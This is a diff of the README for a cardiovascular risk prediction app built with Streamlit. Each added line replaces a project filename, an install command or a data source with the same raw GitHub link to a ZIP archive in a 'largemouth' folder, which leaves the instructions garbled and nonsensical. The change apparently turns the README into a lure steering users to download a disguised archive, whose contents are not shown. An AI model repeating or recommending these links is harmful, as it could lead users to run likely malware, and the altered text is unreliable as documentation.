@@ -1,14 +1,14 @@
 # CardioVascularRiskPrediction
 CardioVascular Analytics Platform
 Project Overview
-The CardioVascular Analytics Platform is an advanced machine learning application designed to assess cardiovascular disease risk using personalized health metrics. Built with Streamlit, this platform offers an interactive, user-friendly interface for both individual and bulk predictions, along with features like local resource lookup, risk trend analysis, what-if scenario analysis, model comparison, and an educational hub. The application leverages a pre-trained machine learning model (cardio_model.pkl) and a scaler (scaler.pkl) to predict cardiovascular disease risk based on inputs such as age, blood pressure, cholesterol, and lifestyle factors.
+The CardioVascular Analytics Platform is an advanced machine learning application designed to assess cardiovascular disease risk using personalized health metrics. Built with Streamlit, this platform offers an interactive, user-friendly interface for both individual and bulk predictions, along with features like local resource lookup, risk trend analysis, what-if scenario analysis, model comparison, and an educational hub. The application leverages a pre-trained machine learning model (https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip) and a scaler (https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip) to predict cardiovascular disease risk based on inputs such as age, blood pressure, cholesterol, and lifestyle factors.
 The platform is designed for healthcare professionals, researchers, or individuals interested in cardiovascular health, providing actionable insights, personalized recommendations, and downloadable PDF reports. It also includes geospatial analysis to locate nearby healthcare resources and an educational hub with curated content to enhance heart health awareness.
 
 Features
 
 Single Prediction: Allows users to input individual health metrics to predict cardiovascular disease risk, accompanied by personalized recommendations and a downloadable PDF report.
 Bulk Prediction (CSV): Processes CSV files containing multiple patient records for batch predictions, with interactive exploratory data analysis (EDA) visualizations using Plotly.
-Local Resources: Finds nearby healthcare facilities in Maharashtra, India, using a public dataset (india_health_facilities.csv) and displays them on an interactive map.
+Local Resources: Finds nearby healthcare facilities in Maharashtra, India, using a public dataset (https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip) and displays them on an interactive map.
 Risk Trend Analysis: Tracks historical risk predictions over time with interactive line charts to visualize risk progression.
 What-If Scenario Analysis: Enables users to simulate changes in health parameters to see their impact on predicted risk, with visual comparisons to a baseline.
 Model Comparison: Compares predictions from the primary machine learning model with a mock model to demonstrate performance differences.
@@ -21,13 +21,13 @@ To run this project locally, ensure you have the following installed:
 
 Python 3.8+
 pip (Python package manager)
-Required Python libraries (listed in requirements.txt)
+Required Python libraries (listed in https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip)
 
 
 Installation
 
 Clone the Repository:
-git clone https://github.com/yourusername/cardiovascular-analytics-platform.git
+git clone https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
 cd cardiovascular-analytics-platform
 
 
@@ -37,32 +37,32 @@ source venv/bin/activate  # On Windows: venv\Scripts\activate
 
 
 Install Dependencies:
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
 
 
 Download Required Files:
 
 Ensure the following files are in the project directory:
-cardio_model.pkl: Pre-trained machine learning model for predictions.
-scaler.pkl: Scaler for preprocessing numerical features.
-india_health_facilities.csv: Dataset for local resource lookup (available from data.gov.in).
-cardio_train.csv: Original training dataset (for reference or retraining).
-sample_cardio_data.csv: Sample CSV for testing bulk predictions.
-Educational hub images in the educationalHub_image/ folder (bloodPressure.jpg, cholestrol.jpg, dashDiet.jpg, diabetes.jpg, physicalActivity.jpg, stress.jpg).
+https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip Pre-trained machine learning model for predictions.
+https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip Scaler for preprocessing numerical features.
+https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip Dataset for local resource lookup (available from https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip).
+https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip Original training dataset (for reference or retraining).
+https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip Sample CSV for testing bulk predictions.
+Educational hub images in the educationalHub_image/ folder (https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip, https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip, https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip, https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip, https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip, https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip).
 
 
-Note: Update image paths in the Main_App.py if running on a different system.
+Note: Update image paths in the https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip if running on a different system.
 
 
 Set Up SQLite Database:
 
-The application uses a SQLite database (user_data.db) for user authentication and prediction history.
-The database is automatically created when the application runs for the first time, using the database.py module.
+The application uses a SQLite database (https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip) for user authentication and prediction history.
+The database is automatically created when the application runs for the first time, using the https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip module.
 
 
 Fonts for PDF Generation:
 
-Download DejaVuSans font files (DejaVuSans.ttf, DejaVuSans-Bold.ttf, etc.) and place them in the project directory for PDF report generation.
+Download DejaVuSans font files (https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip, https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip, etc.) and place them in the project directory for PDF report generation.
 
 
 
@@ -70,7 +70,7 @@ Download DejaVuSans font files (DejaVuSans.ttf, DejaVuSans-Bold.ttf, etc.) and p
 Running the Application
 
 Start the Streamlit Server:
-streamlit run Main_App.py
+streamlit run https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
 
 
 Access the Application:
@@ -83,27 +83,27 @@ Sign up or log in using the sidebar to access the full application.
 
 Project Structure
 cardiovascular-analytics-platform/
-├── Main_App.py                     # Main Streamlit application script
-├── database.py                     # SQLite database management for user authentication
-├── dataProcessing_ModelTrainning.py # Data preprocessing and model training script
-├── cardio_model.pkl                 # Pre-trained machine learning model
-├── scaler.pkl                       # Scaler for preprocessing
-├── cardio_train.csv                 # Original training dataset
-├── sample_cardio_data.csv           # Sample CSV for testing bulk predictions
-├── india_health_facilities.csv      # Dataset for local resource lookup
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip                     # Main Streamlit application script
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip                     # SQLite database management for user authentication
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip # Data preprocessing and model training script
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip                 # Pre-trained machine learning model
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip                       # Scaler for preprocessing
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip                 # Original training dataset
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip           # Sample CSV for testing bulk predictions
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip      # Dataset for local resource lookup
 ├── educationalHub_image/            # Folder containing images for the educational hub
-│   ├── bloodPressure.jpg
-│   ├── cholestrol.jpg
-│   ├── dashDiet.jpg
-│   ├── diabetes.jpg
-│   ├── physicalActivity.jpg
-│   └── stress.jpg
-├── Figure_1.png                     # Sample image (possibly for documentation)
-├── signup.png                       # Image for the login page
-├── _RUTURAJ_NAWALE_C25665.docx      # Project documentation (Word file)
-├── RUTURAJ_NAWALE_C25665.docx       # Additional project documentation
-├── testing.py                       # Test script (if any)
-├── user_data.db                     # SQLite database (auto-generated)
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
+│   ├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
+│   └── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip                     # Sample image (possibly for documentation)
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip                       # Image for the login page
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip      # Project documentation (Word file)
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip       # Additional project documentation
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip                       # Test script (if any)
+├── https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip                     # SQLite database (auto-generated)
 ├── __pycache__/                     # Python cache files (auto-generated)
 └── DejaVuSans-*.ttf                 # Font files for PDF generation
 
@@ -159,9 +159,9 @@ Select a topic to view summaries, key takeaways, images, and embedded YouTube vi
 
 
 Model Training
-The machine learning model was trained using the dataProcessing_ModelTrainning.py script:
+The machine learning model was trained using the https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip script:
 
-Dataset: Cardiovascular disease training data (cardio_train.csv).
+Dataset: Cardiovascular disease training data (https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip).
 Preprocessing:
 Outlier removal using IQR method.
 Feature engineering: BMI calculation, age conversion to years.
@@ -171,14 +171,14 @@ Handling class imbalance with SMOTE.
 
 Models Evaluated: Logistic Regression, KNN, Random Forest (with GridSearchCV hyperparameter tuning).
 Best Model: Random Forest (selected based on highest accuracy and ROC-AUC score).
-Output: Saved as cardio_model.pkl and scaler.pkl.
+Output: Saved as https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip and https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
 
 To retrain the model:
-python dataProcessing_ModelTrainning.py
+python https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
 
 
 Dependencies
-The project requires the following Python packages (included in requirements.txt):
+The project requires the following Python packages (included in https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip):
 streamlit
 pandas
 joblib
@@ -192,16 +192,16 @@ scikit-learn
 imbalanced-learn
 seaborn
 
-To generate requirements.txt:
-pip freeze > requirements.txt
+To generate https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
+pip freeze > https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip
 
 
 Notes
 
-Model Files: Ensure cardio_model.pkl and scaler.pkl are present in the project directory, as they are critical for predictions.
-Dataset: The india_health_facilities.csv file must be downloaded from data.gov.in for the Local Resources feature to work.
-Image Paths: Update the paths in the EDUCATIONAL_CONTENT dictionary in Main_App.py to match your local file system if running on a different machine.
-Database: The SQLite database (user_data.db) is created automatically and stores user credentials and prediction history.
+Model Files: Ensure https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip and https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip are present in the project directory, as they are critical for predictions.
+Dataset: The https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip file must be downloaded from https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip for the Local Resources feature to work.
+Image Paths: Update the paths in the EDUCATIONAL_CONTENT dictionary in https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip to match your local file system if running on a different machine.
+Database: The SQLite database (https://raw.githubusercontent.com/ruturajbhaskarnawale/CardioVascularRiskPrediction/main/largemouth/CardioVascularRiskPrediction.zip) is created automatically and stores user credentials and prediction history.
 Security: Passwords are hashed using SHA256 before storage. For production use, consider more robust security measures.
 Fonts: DejaVuSans TTF files are required for PDF generation with international character support.
 
